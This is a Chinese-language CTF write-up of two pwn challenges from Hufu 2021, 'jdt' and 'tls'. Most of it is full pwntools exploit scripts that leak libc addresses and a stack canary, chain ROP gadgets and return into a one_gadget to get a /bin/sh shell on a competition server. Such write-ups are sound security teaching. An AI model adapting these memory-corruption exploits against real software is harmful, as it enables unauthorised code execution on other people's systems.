---
title: 虎符2021线下Pwn题WP
date: 2021-05-09T12:16:31+08:00
lastmod: 2021-05-09T12:16:31+08:00
author: Ch4rc0al

#cover: /img/cover.jpg
categories:
  - WriteUps
tags:
  - Pwn 
  - CTF
# nolastmod: true
---

<!--more-->

## jdt

>    Arch:     amd64-64-little  
>    RELRO:    Full RELRO  
>    Stack:    Canary found  
>    NX:       NX enabled  
>    PIE:      PIE enabled  

题目在栈上操作，代码审计发现虽然只能创建16个book，但可以edit和show第17个book，会打印出rbp附近内容。

我们获取并利用`__libc_start_main_ret`的真实地址来得到远程libc版本和libc基址，网上下载libc文件得到`one_gadget`偏移，修改ret为`ong_gadget`即可，需要注意的一点是我们需要在栈中填充一定的字符才能打印出地址来。
```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')

def create(p,a,n,d):
    sh.sendlineafter("Choice: ","1")
    sh.sendlineafter("Price?",p)
    sh.sendlineafter("Author?",a)
    sh.sendlineafter("Book's name?",n)
    sh.sendlineafter("Description?",d)
    
def edit(index,choice,data):
    sh.sendlineafter("Choice: ","2")
    sh.sendlineafter("idx?",str(index))
    sh.sendlineafter("Choice: ",str(choice))
    if(choice==1):
       sh.sendafter("Price?",data)
    elif(choice==2):
        sh.sendafter("Author?",data)
    elif(choice==3):
        sh.sendafter("Book's Name?",data)
    elif(choice==4):
        sh.sendafter("Description?",data)

def show(index):
    sh.sendlineafter("Choice: ","3")
    sh.sendlineafter("idx?",str(index))
    #sh.recv()

def sell(index):
    sh.sendlineafter("Choice: ","4")
    sh.sendlineafter("idx?",str(index))

#sh=process('./jdt')
sh=remote('dawnaa.cn',9001)
elf=ELF('./jdt')
libc=ELF('./jdt_libc')
for i in range(0,16):
    create(str(i),'aaa','bbb','ccc')

edit(16,2,"aaaaaaaa")
show(16)
sh.recvuntil("Author: ")
libc_start_main_ret=u64(sh.recv()[8:14]+"\x00\x00")

libc_base=libc_start_main_ret-libc.symbols['__libc_start_main']-231
ogg=libc_base+0x45226
edit(16,3,'aaaaaaaa'+p64(ogg))
print hex(libc_start_main_ret)
print hex(libc_base)
print hex(ogg)
show(16)
sh.send('5')
sh.interactive()

'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

```

---
## tls
>    Arch:     amd64-64-little  
>    RELRO:    Full RELRO  
>    Stack:    Canary found  
>    NX:       NX enabled  
>    PIE:      No PIE (0x400000)  

vuln函数运行在线程中，不影响我们正常做题，gdb调试时用`thread`命令切换至线程调试即可

依然是栈题，给出了libc，审计代码发现pos没有规定范围，我们可以修改一开始设定的size并输出calc来达到泄露`canary`的目的，一开始我们需要将`rbp-16`清为0。

泄露`canary`后，我们就可以构造`rop`链用`puts`来输出真实地址，最终将ret改为`one_gadget`即可。

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
sh=remote('dawnaa.cn',9003)
#sh=process("./tls")#env = {"LD_PRELOAD" : "./tls_libc"})
elf=ELF("./tls")
libc=ELF("./tls_libc")
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
sh.sendlineafter("How many? ","1")
sh.sendlineafter(" = ","0")

sh.sendlineafter("Your choice: ","1")
sh.sendlineafter("Please input pos: ","54")
sh.sendlineafter("Your choice: ","2")
sh.sendlineafter("Please input new number: ","0")

sh.sendlineafter("Your choice: ","1")
sh.sendlineafter("Please input pos: ","-4")
sh.sendlineafter("Your choice: ","2")
sh.sendlineafter("Please input new number: ","56")
sh.sendlineafter("Your choice: ","3")
sh.recvuntil("result = ")
canary=int(sh.recvline()[:-1],10)
print hex(canary)

pop_rdi=0x401293
sh.sendlineafter("Your choice: ","4")
payload='a'*0x38+p64(canary)+'bbbbbbbb'+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x400dc4)
sh.sendlineafter("Oh!What is your name? ",payload)
sh.recvuntil("GoodBye.")
sh.recvuntil("a"*24)
sh.recvuntil("\n")
puts_got=u64(sh.recvline()[:6].ljust(8,'\x00'))
print hex(puts_got)
libc_base=puts_got-libc.symbols['puts']
print hex(libc_base)
ogg=libc_base+0x4526a
print hex(ogg)
payload='a'*0x38+p64(canary)+'bbbbbbbb'+p64(ogg)
sh.sendlineafter("How many? ","1")
sh.sendlineafter(" = ","0")
sh.sendlineafter("Your choice: ","4")
sh.sendlineafter("Oh!What is your name? ",payload)
sh.interactive()


```
